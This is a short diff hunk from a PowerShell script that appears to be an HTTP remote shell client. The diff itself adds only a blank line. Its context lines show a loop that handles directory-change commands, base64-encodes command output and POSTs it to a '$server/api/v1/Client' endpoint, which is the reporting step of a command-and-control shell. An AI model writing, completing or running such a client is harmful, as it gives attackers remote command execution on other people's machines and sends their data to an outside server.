@@ -94,3 +94,4 @@ while ($true) {
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
    $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
    $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }
+   
